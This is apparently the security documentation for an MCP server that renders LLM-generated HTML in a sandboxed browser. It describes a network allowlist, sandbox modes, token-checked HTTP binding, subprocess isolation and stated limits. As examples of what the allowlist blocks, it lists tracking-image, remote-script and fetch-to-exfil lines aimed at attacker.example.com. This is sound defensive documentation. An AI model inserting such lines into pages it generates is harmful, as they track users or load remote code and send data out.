# Security

`mockit-mcp` runs untrusted HTML produced by an LLM through a real browser. The threat model focuses on **bounding what that HTML can do**, plus standard transport-layer hygiene.

---

## Threat model in two sentences

1. **The model output is untrusted.** A prompt-injection or hostile training signal could produce HTML that tries to phone home, fingerprint, or escape the renderer.
2. **The HTTP transport sees external requests.** Anyone who reaches the port could trigger generations on your dime.

Everything below is scoped to those two threats.

---

## Renderer sandboxing

### Network allowlist

Only three hosts can be reached from inside the rendered page:

```ts
host === "cdn.tailwindcss.com" ||
host === "fonts.googleapis.com" ||
host === "fonts.gstatic.com"
```

Plus `data:` URIs for inline assets. **Everything else is `route.abort()`'d before the request leaves the browser.**

This means:

- ✓ Tailwind CDN (the design system uses it)
- ✓ Google Fonts (Inter, Space Grotesk, Playfair Display, Plus Jakarta Sans)
- ✓ `data:image/png;base64,...` inline images
- ✗ `<img src="https://attacker.example.com/track.gif">` — blocked
- ✗ `<script src="https://attacker.example.com/payload.js">` — blocked
- ✗ `fetch("https://attacker.example.com/exfil")` — blocked
- ✗ Anything DNS-rebinding-style — fail-closed on URL parse errors

The allowlist lives in `src/renderer.ts`. Adding a host requires a code change.

### Chromium sandbox

`PLAYWRIGHT_NO_SANDBOX` controls whether Chromium runs with its setuid sandbox.

| Mode | Behavior |
|------|----------|
| `auto` (default) | Sandbox **enabled** on bare-metal hosts; **disabled** inside containers (`MOCKIT_IN_CONTAINER=1` or `GITHUB_ACTIONS=true`) |
| `true` | Sandbox forcibly disabled (do this in containers without proper user namespaces) |
| `false` | Sandbox forcibly enabled (will fail in containers without setup) |

Why disable in containers: Microsoft's Playwright base image runs as `pwuser`, but Chromium's setuid sandbox needs `chrome-sandbox` with elevated permissions, which conflicts with non-root containers. Outside containers, leaving the sandbox on adds a layer of OS-level isolation.

### What the sandbox does for you

If hostile HTML somehow exploits a Chromium bug (a *capable* attacker with a Chromium 0-day), the sandbox limits the blast to a tightly-restricted process — the attacker can't read your files or escape to the host.

Combined with the network allowlist, the practical attack surface is: in-process exploit + Chromium 0-day + something to do once you're stuck inside the renderer with no network. Vanishingly small in the wild.

---

## HTTP transport

### Bind safety

```ts
const isLoopbackBind =
  host === "127.0.0.1" || host === "::1" || host === "localhost";

if (!isLoopbackBind && !authToken) {
  console.error(`Refusing to start: HTTP_HOST="${host}" ... MCP_HTTP_TOKEN is not set.`);
  process.exit(1);
}
```

You **cannot** start the HTTP server on a non-loopback interface without setting `MCP_HTTP_TOKEN`. There's no override flag. This was deliberate — every other path lets you accidentally expose the server to the network.

### Bearer-token comparison

```ts
import { timingSafeEqual } from "node:crypto";
const expected = Buffer.from(`Bearer ${authToken}`);
// ...
const got = Buffer.from(header);
const ok = got.length === expected.length && timingSafeEqual(got, expected);
```

Length-prefix check (so `timingSafeEqual` doesn't throw on mismatched lengths) plus a constant-time comparison. A network attacker can't probe the token character-by-character.

### What `/health` exposes

```json
{"ok": true, "transport": "http"}
```

No version, no commit SHA, no environment info. `/health` is intentionally bland — fine for monitoring, useless for fingerprinting.

---

## Subprocess isolation (`cli` backend)

`mockit-mcp` calls `claude` via `child_process.spawn`:

- **`shell: false`** — no shell interpolation. The prompt goes through stdin (`child.stdin.write(stdinText)`), not via argv. Shell-injection style attacks don't apply.
- **stderr redaction** — when the subprocess fails, any `/Users/<name>`, `/home/<name>`, or `C:\Users\<name>` paths in its stderr are replaced with `<redacted>` before the error reaches the MCP response.
- **No-session-persistence** — subprocesses use `--no-session-persistence` so they don't write to the user's `claude` session history.

---

## Storage paths

`storage.ts` only writes inside `DESIGNS_DIR`. `slug()` strips `..`, `/`, and special characters from project and screen names. Path traversal isn't reachable from user input.

```ts
function slug(s: string): string {
  return s.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 60);
}
```

UUIDs (`screen_id`) use `crypto.randomUUID()` — no user input ever interpolates into a path.

---

## What's *not* protected

Be honest with yourself about these:

- **API spend if your token leaks.** Bearer tokens in plaintext logs / config files / shared envs are the #1 risk. Rotate if exposed; use secret managers when possible.
- **Multi-tenant isolation.** This server has one trust boundary. Every authenticated user can read every saved screen.
- **Rate limiting / DoS.** Express body limit is 2 MB; beyond that there's nothing built-in. Use a reverse proxy.
- **Output content filtering.** The model's HTML is rendered as-is (within the network allowlist). You trust the model not to output, e.g., misleading text.
- **HTTPS.** `mockit-mcp` speaks plain HTTP. Terminate TLS at a reverse proxy.

---

## Reporting a vulnerability

Open a GitHub issue marked `[security]`, or — if it's pre-disclosure — start a [private security advisory](https://github.com/karyaboyraz/mockit-mcp/security/advisories/new).

I'll respond within a few days.
